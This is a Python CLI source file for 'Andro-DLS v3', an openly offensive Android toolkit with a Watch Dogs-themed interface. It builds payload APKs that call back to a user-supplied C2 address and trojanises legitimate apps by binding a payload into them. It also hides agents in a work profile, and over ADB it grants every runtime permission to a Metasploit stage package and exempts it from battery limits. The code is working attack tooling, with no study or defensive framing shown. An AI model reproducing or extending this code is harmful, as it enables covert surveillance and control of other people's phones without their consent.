"""Andro-DLS v3 — CLI with Watch Dogs ctOS UI."""

from __future__ import annotations

import os
import shutil
import subprocess
import json
import random
import time
import sys
from pathlib import Path
from datetime import datetime

from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table
from rich.text import Text
from rich.columns import Columns

from modules import banner
from modules.console import console, ask, confirm, adb, print_error, print_success, print_warning
from modules.config import AppConfig
from modules.tools import resolve_external_tools
from modules.console import set_adb_executable


def _project_root() -> Path:
    return Path(__file__).resolve().parent.parent


# ─── Boot Sequence ─────────────────────────────────────────────────────────

BOOT_LINES = [
    ("[dim][SYS][/dim]", "Andro-DLS v3.0.0 — initializing..."),
    ("[dim][SYS][/dim]", "Loading kernel modules..."),
    ("[cyan][NET][/cyan]", "Scanning network interfaces..."),
    ("[dim][SYS][/dim]", "Initializing ctOS bridge..."),
    ("[cyan][NET][/cyan]", "Interface wlan0: UP"),
    ("[dim][SEC][/dim]", "Encryption: AES-256-CBC"),
    ("[dim][SEC][/dim]", "Handshake: ECDH P-384"),
    ("[green][OK][/green]", "All systems nominal"),
    ("", ""),
    ("[bold white]>>[/bold white]", "[bold green]Ready.[/bold green]"),
]


def boot_sequence():
    """Play fake system boot animation (~3-4 seconds)."""
    console.print("")
    for prefix, msg in BOOT_LINES:
        console.print(f"  {prefix}  {msg}")
        time.sleep(0.25 + random.uniform(0, 0.2))
    console.print("")
    time.sleep(0.5)


# ─── Side Panel ────────────────────────────────────────────────────────────

DEVICES_FILE = ".payload-build/devices.json"


def save_device(serial, name="", ip="", last_seen=""):
    root = _project_root()
    path = root / DEVICES_FILE
    path.parent.mkdir(parents=True, exist_ok=True)
    devices = []
    if path.exists():
        try:
            devices = json.loads(path.read_text())
        except Exception:
            devices = []
    for d in devices:
        if d.get("serial") == serial:
            d["name"] = name or d.get("name", "")
            d["ip"] = ip or d.get("ip", "")
            d["last_seen"] = last_seen or datetime.now().strftime("%Y-%m-%d %H:%M")
            path.write_text(json.dumps(devices, indent=2))
            return
    devices.append({"serial": serial, "name": name, "ip": ip, "last_seen": last_seen or datetime.now().strftime("%Y-%m-%d %H:%M")})
    path.write_text(json.dumps(devices, indent=2))


def load_devices():
    root = _project_root()
    path = root / DEVICES_FILE
    if path.exists():
        try:
            return json.loads(path.read_text())
        except Exception:
            return []
    return []


def get_live_devices():
    """Return list of live device serials."""
    from modules.console import adb_output
    out = adb_output("devices")
    if not out:
        return []
    return [l.split()[0] for l in out.split("\n")[1:] if "device" in l and "offline" not in l]


def get_keeper_status():
    """Quick check if keeper process is running."""
    try:
        r = subprocess.run(["pgrep", "-f", "keeper.py"], capture_output=True, text=True)
        return "running" if r.returncode == 0 else "idle"
    except Exception:
        return "unknown"


def side_panel_main() -> Panel:
    """Side panel for main menu — system overview."""
    now = datetime.now().strftime("%H:%M:%S")
    date = datetime.now().strftime("%Y-%m-%d")
    live = get_live_devices()
    saved = load_devices()
    keeper = get_keeper_status()

    lines = []
    lines.append("[bold white]SYSTEM[/bold white]")
    lines.append(f"  [dim]time[/dim]    {now}")
    lines.append(f"  [dim]date[/dim]    {date}")
    lines.append(f"  [dim]host[/dim]    {os.uname().nodename}")
    lines.append("")
    lines.append("[bold white]DEVICES[/bold white]")
    lines.append(f"  [dim]online[/dim]  [green]{len(live)}[/green]")
    lines.append(f"  [dim]saved[/dim]   {len(saved)}")
    for d in saved[:3]:
        status = "[green]●[/green]" if d.get("serial") in live else "[dim]○[/dim]"
        lines.append(f"    {status} {d.get('name', '?')}")
    lines.append("")
    lines.append("[bold white]KEEPER[/bold white]")
    kcolor = "green" if keeper == "running" else "dim"
    lines.append(f"  [dim]status[/dim]  [{kcolor}]{keeper}[/{kcolor}]")
    return Panel("\n".join(lines), border_style="white", title="[dim]STATUS[/dim]", padding=(0, 1))


def side_panel_devices() -> Panel:
    """Side panel for devices page — live device list."""
    live = get_live_devices()
    saved = load_devices()

    lines = []
    lines.append("[bold white]LIVE[/bold white]")
    if live:
        for serial in live:
            model, _ = adb("-s", serial, "shell", "getprop", "ro.product.model", timeout=3)
            lines.append(f"  [green]●[/green] {model or serial}")
    else:
        lines.append("  [dim]none[/dim]")
    lines.append("")
    lines.append("[bold white]SAVED[/bold white]")
    for d in saved:
        status = "[green]●[/green]" if d.get("serial") in live else "[dim]○[/dim]"
        lines.append(f"  {status} {d.get('name', '?')}")
    return Panel("\n".join(lines), border_style="white", title="[dim]DEVICES[/dim]", padding=(0, 1))


def side_panel_build() -> Panel:
    """Side panel for build page — build info."""
    root = _project_root()
    apks = []
    for name in ["androdls-agent.apk", "androdls-enhanced.apk", "trojan.apk"]:
        p = root / name
        if p.exists():
            size = p.stat().st_size
            if size > 1024 * 1024:
                size_str = f"{size / 1024 / 1024:.1f} MB"
            else:
                size_str = f"{size / 1024:.0f} KB"
            apks.append((name, size_str))

    lines = []
    lines.append("[bold white]BUILDS[/bold white]")
    if apks:
        for name, size in apks:
            lines.append(f"  {name}")
            lines.append(f"    [dim]{size}[/dim]")
    else:
        lines.append("  [dim]none yet[/dim]")
    return Panel("\n".join(lines), border_style="white", title="[dim]BUILDS[/dim]", padding=(0, 1))


def side_panel(page: str) -> Panel:
    """Return context-aware side panel."""
    panels = {
        "main": side_panel_main,
        "devices": side_panel_devices,
        "build": side_panel_build,
    }
    fn = panels.get(page, side_panel_main)
    return fn()


# ─── Render ────────────────────────────────────────────────────────────────

def render_page(page_name: str, page_num: int = 0):
    """Render full screen: banner + menu + side panel + footer."""
    os.system("clear")

    # Banner
    console.print(banner.banner)

    # Menu text (left) + side panel (right)
    menu_text = banner.menu[page_num] if page_num < len(banner.menu) else banner.menu[0]
    side = side_panel(page_name)

    # Use Columns for side-by-side layout
    columns = Columns([menu_text, side], equal=True, expand=True)
    console.print(columns)

    # Footer
    now = datetime.now().strftime("%H:%M:%S")
    live = len(get_live_devices())
    console.print(f"\n[dim]─── [{now}] │ {live} online │ ctOS active ───[/dim]")


# ─── Check ADB ─────────────────────────────────────────────────────────────

def check_adb(config: AppConfig) -> bool:
    if shutil.which("adb"):
        config.adb_path = "adb"
        return True
    if config.adb_path and Path(config.adb_path).is_file():
        return True
    console.print(Panel("[red]ADB not found.[/red]\n[dim]Run: bash install.sh --yes[/dim]", border_style="red"))
    return False


# ─── USB Setup ─────────────────────────────────────────────────────────────

def usb_setup(config: AppConfig):
    console.print(Panel("[bold white]USB → WIRELESS[/bold white]\n[dim]Switch phone to wireless ADB.[/dim]", border_style="white"))
    if not check_adb(config):
        return
    out, rc = adb("devices")
    lines = out.strip().split("\n")[1:]
    usb_devices = [l.split()[0] for l in lines if "device" in l and "offline" not in l]
    if not usb_devices:
        console.print("\n[yellow]No USB device.[/yellow]")
        console.print("\n[dim]1. Connect phone via USB[/dim]")
        console.print("[dim]2. Settings → About → Tap 'Build Number' 7x[/dim]")
        console.print("[dim]3. Settings → Developer Options → USB Debugging ON[/dim]")
        return
    device = usb_devices[0]
    model, _ = adb("-s", device, "shell", "getprop", "ro.product.model")
    android, _ = adb("-s", device, "shell", "getprop", "ro.build.version.release")
    console.print(f"\n[cyan]●[/cyan] {model} · Android {android}")
    if not confirm("\nSwitch to wireless?"):
        return
    out, rc = adb("-s", device, "tcpip", "5555")
    if rc != 0:
        print_error(f"tcpip failed: {out}")
        return
    console.print(f"[green]✓[/green] {out.strip()}")
    time.sleep(3)
    ip_out, _ = adb("-s", device, "shell", "ip", "-f", "inet", "addr", "show", "wlan0")
    ip = ""
    for line in ip_out.split("\n"):
        if "inet " in line:
            for p in line.strip().split():
                if p.startswith(("192.168.", "10.", "172.")):
                    ip = p.split("/")[0]
                    break
    if not ip:
        ip = ask("[cyan]Phone IP[/cyan] > ").strip()
    out, rc = adb("connect", f"{ip}:5555")
    if "connected" in out.lower():
        name = ask("\n[cyan]Device name[/cyan] > ").strip() or "Unknown"
        save_device(serial=f"{ip}:5555", name=name, ip=ip)
        console.print(f"\n[green]✓[/green] [white]{name}[/white] @ {ip}:5555")
    else:
        print_warning(f"Try: adb connect {ip}:5555")


# ── Connected Devices ─────────────────────────────────────────────────────

def list_devices(config: AppConfig):
    live = get_live_devices()
    devices = load_devices()
    table = Table(border_style="white")
    table.add_column("", style="bold", width=2)
    table.add_column("NAME", style="white")
    table.add_column("SERIAL", style="dim")
    table.add_column("IP", style="dim")
    for d in devices:
        status = "[green]●[/green]" if d.get("serial") in live else "[dim]○[/dim]"
        model = ""
        if d.get("serial") in live:
            model, _ = adb("-s", d["serial"], "shell", "getprop", "ro.product.model", timeout=3)
        table.add_row(status, f"{d.get('name', '?')} {model}", d.get("serial", "?"), d.get("ip", "—"))
    if not devices:
        console.print("[dim]no saved devices[/dim]")
    else:
        console.print(table)


def connect_device(config: AppConfig):
    devices = load_devices()
    if not devices:
        console.print("[dim]no saved devices[/dim]")
        return
    for i, d in enumerate(devices, 1):
        console.print(f"  [dim]{i}.[/dim] [white]{d.get('name', '?')}[/white] [dim]({d.get('ip', '?')})[/dim]")
    choice = ask("\n[cyan]device[/cyan] > ").strip()
    if not choice.isdigit() or int(choice) < 1 or int(choice) > len(devices):
        print_error("invalid")
        return
    d = devices[int(choice) - 1]
    ip = d.get("ip", "")
    if not ip:
        print_error("no IP")
        return
    out, rc = adb("connect", f"{ip}:5555")
    if "connected" in out.lower():
        console.print(f"[green]✓[/green] {d.get('name')}")
        save_device(serial=f"{ip}:5555", name=d.get("name"), ip=ip)


def reconnect_last(config: AppConfig):
    devices = load_devices()
    if not devices:
        console.print("[dim]no saved devices[/dim]")
        return
    last = devices[-1]
    ip = last.get("ip", "")
    if not ip:
        print_error("no IP")
        return
    out, rc = adb("connect", f"{ip}:5555")
    if "connected" in out.lower():
        console.print(f"[green]✓[/green] {last.get('name')}")
    else:
        print_warning("failed")


def device_info(config: AppConfig):
    live = get_live_devices()
    if not live:
        console.print("[dim]no devices[/dim]")
        return
    serial = live[0]
    props = [("model", "ro.product.model"), ("android", "ro.build.version.release"), ("api", "ro.build.version.sdk"), ("cpu", "ro.product.cpu.abi")]
    table = Table(border_style="white")
    table.add_column("PROPERTY", style="dim")
    table.add_column("VALUE", style="white")
    for label, prop in props:
        val, _ = adb("-s", serial, "shell", "getprop", prop, timeout=3)
        table.add_row(label, val or "N/A")
    bat_out, _ = adb("-s", serial, "shell", "dumpsys", "battery", timeout=3)
    for line in bat_out.split("\n"):
        if "level:" in line:
            table.add_row("battery", line.split(":")[1].strip() + "%")
            break
    console.print(table)


def pull_apks(config: AppConfig):
    console.print(Panel("[bold white]APK EXTRACTOR[/bold white]\n[dim]Pulling all installed APKs...[/dim]", border_style="white"))
    if not check_adb(config):
        return
    out, rc = adb("devices")
    if rc != 0 or len([l for l in out.split("\n")[1:] if "device" in l]) == 0:
        console.print("[dim]no device[/dim]")
        return
    from modules.usb_apk_extractor import run_extractor
    run_extractor()


def grant_permissions(config: AppConfig):
    console.print(Panel("[bold white]PERMISSIONS[/bold white]\n[dim]Granting all runtime permissions...[/dim]", border_style="white"))
    PKG = "com.metasploit.stage"
    out, rc = adb("devices")
    if rc != 0 or len([l for l in out.split("\n")[1:] if "device" in l]) == 0:
        console.print("[dim]no device[/dim]")
        return
    from modules.usb_permissions import grant_permissions as gp
    count = gp(PKG, "all")
    if count > 0:
        adb("shell", "dumpsys", "deviceidle", "whitelist", f"+{PKG}")
        console.print(f"\n[green]✓[/green] {count} granted + whitelisted")


# ─── Build Agent ───────────────────────────────────────────────────────────

def build_pure(config: AppConfig):
    console.print(Panel("[bold white]PURE BUILD[/bold white]\n[dim]no msfvenom — stealthy[/dim]", border_style="white"))
    lhost = ask("[cyan]C2 IP[/cyan] > ").strip()
    lport = ask("[cyan]port[/cyan] > ").strip() or "4445"
    if not lhost:
        print_error("IP required")
        return
    root = _project_root()
    out_path = root / "androdls-agent.apk"
    cmd = ["bash", str(root / "build_agent_pure.sh"), lhost, lport, str(out_path)]
    with Progress(SpinnerColumn(), TextColumn("[dim]{task.description}[/dim]"), transient=True) as progress:
        task = progress.add_task("building...", total=None)
        r = subprocess.run(cmd, capture_output=True, text=True, cwd=str(root))
        progress.update(task, completed=True)
    print(r.stdout)
    if r.returncode == 0:
        print_success(f"built: {out_path.name}")
    else:
        print(r.stderr)
        print_error("failed")


def build_enhanced(config: AppConfig):
    console.print(Panel("[bold white]ENHANCED BUILD[/bold white]\n[dim]msfvenom + 6-layer[/dim]", border_style="white"))
    lhost = ask("[cyan]C2 IP[/cyan] > ").strip()
    lport = ask("[cyan]port[/cyan] > ").strip() or "4445"
    if not lhost:
        print_error("IP required")
        return
    root = _project_root()
    out_path = root / "androdls-enhanced.apk"
    cmd = ["bash", str(root / "build_payload_enhanced.sh"), "--agent", "--camo", "--fgs", lhost, lport, str(out_path)]
    with Progress(SpinnerColumn(), TextColumn("[dim]{task.description}[/dim]"), transient=True) as progress:
        task = progress.add_task("building...", total=None)
        r = subprocess.run(cmd, capture_output=True, text=True, cwd=str(root))
        progress.update(task, completed=True)
    print(r.stdout)
    if r.returncode == 0:
        print_success(f"built: {out_path.name}")
    else:
        print(r.stderr)
        print_error("failed")


def build_trojan(config: AppConfig):
    console.print(Panel("[bold white]TROJAN BIND[/bold white]\n[dim]inject into legit APK[/dim]", border_style="white"))
    legit = ask("[cyan]APK path[/cyan] > ").strip()
    if not legit or not Path(legit).exists():
        print_error("APK not found")
        return
    lhost = ask("[cyan]C2 IP[/cyan] > ").strip()
    lport = ask("[cyan]port[/cyan] > ").strip() or "4445"
    if not lhost:
        print_error("IP required")
        return
    root = _project_root()
    out_path = root / "trojan.apk"
    cmd = ["bash", str(root / "bind_payload.sh"), legit, lhost, lport, str(out_path)]
    with Progress(SpinnerColumn(), TextColumn("[dim]{task.description}[/dim]"), transient=True) as progress:
        task = progress.add_task("building...", total=None)
        r = subprocess.run(cmd, capture_output=True, text=True, cwd=str(root))
        progress.update(task, completed=True)
    print(r.stdout)
    if r.returncode == 0:
        print_success(f"built: {out_path.name}")
    else:
        print(r.stderr)
        print_error("failed")


def deploy_work_profile(config: AppConfig):
    console.print(Panel("[bold white]WORK PROFILE[/bold white]\n[dim]hidden profile deploy[/dim]", border_style="white"))
    apk = ask("[cyan]APK path[/cyan] > ").strip()
    root = _project_root()
    if not apk:
        for name in ["androdls-agent.apk", "androdls-enhanced.apk"]:
            p = root / name
            if p.exists():
                apk = str(p)
                break
    if not apk or not Path(apk).exists():
        print_error("no APK")
        return
    from modules.work_profile import deploy
    deploy(apk)


def deploy_to_device(config: AppConfig):
    console.print(Panel("[bold white]DEPLOY[/bold white]\n[dim]install + perms + launch[/dim]", border_style="white"))
    root = _project_root()
    apk = ask("[cyan]APK path[/cyan] > ").strip()
    if not apk:
        for name in ["androdls-agent.apk", "androdls-enhanced.apk", "payload_enhanced.apk"]:
            p = root / name
            if p.exists():
                apk = str(p)
                break
    if not apk or not Path(apk).exists():
        print_error("no APK")
        return
    cmd = ["bash", str(root / "deploy_agent.sh"), apk]
    with Progress(SpinnerColumn(), TextColumn("[dim]{task.description}[/dim]"), transient=True) as progress:
        task = progress.add_task("deploying...", total=None)
        r = subprocess.run(cmd, capture_output=True, text=True, cwd=str(root))
        progress.update(task, completed=True)
    print(r.stdout)
    if r.returncode == 0:
        print_success("deployed")
    else:
        print(r.stderr)
        print_error("failed")


# ─── Menu Handlers ─────────────────────────────────────────────────────────

def handle_main_menu(config: AppConfig, option: str) -> str:
    match option:
        case "0":
            config.run = False
            console.print("\n[dim]exiting...[/dim]\n")
            return "exit"
        case "1":
            usb_setup(config)
            return "main"
        case "2":
            return "devices"
        case "3":
            return "build"
        case _:
            console.print("\n[red]invalid[/red]\n")
            return "main"


def handle_devices_menu(config: AppConfig, option: str) -> str:
    match option:
        case "99" | "b":
            return "main"
        case "1":
            list_devices(config)
        case "2":
            connect_device(config)
        case "3":
            reconnect_last(config)
        case "4":
            device_info(config)
        case "5":
            pull_apks(config)
        case "6":
            grant_permissions(config)
        case _:
            console.print("\n[red]invalid[/red]\n")
    return "devices"


def handle_build_menu(config: AppConfig, option: str) -> str:
    match option:
        case "99" | "b":
            return "main"
        case "1":
            build_pure(config)
        case "2":
            build_enhanced(config)
        case "3":
            build_trojan(config)
        case "4":
            deploy_work_profile(config)
        case "5":
            deploy_to_device(config)
        case _:
            console.print("\n[red]invalid[/red]\n")
    return "build"


# ─── Main Loop ─────────────────────────────────────────────────────────────

def main(config: AppConfig) -> None:
    page_map = {"main": 0, "devices": 1, "build": 2}
    current_page = "main"

    boot_sequence()
    render_page(current_page, page_map[current_page])

    while config.run:
        try:
            option = ask(f"\n[cyan]>>[/cyan] ").strip().lower()

            if current_page == "main":
                result = handle_main_menu(config, option)
            elif current_page == "devices":
                result = handle_devices_menu(config, option)
            elif current_page == "build":
                result = handle_build_menu(config, option)
            else:
                result = "main"

            if result == "exit":
                break

            if result != current_page:
                current_page = result

            render_page(current_page, page_map.get(current_page, 0))

        except (KeyboardInterrupt, EOFError):
            config.run = False
            console.print("\n[dim]exiting...[/dim]\n")
        except Exception as e:
            console.print(f"\n[red]error:[/red] {e}")
            console.print("[dim]back to main.[/dim]\n")
            current_page = "main"
            render_page("main", 0)


def start(config: AppConfig) -> None:
    Path("Downloaded-Files").mkdir(exist_ok=True)
    resolve_external_tools(config)
    set_adb_executable(config.adb_path)


def run() -> None:
    config = AppConfig()
    start(config)
    main(config)
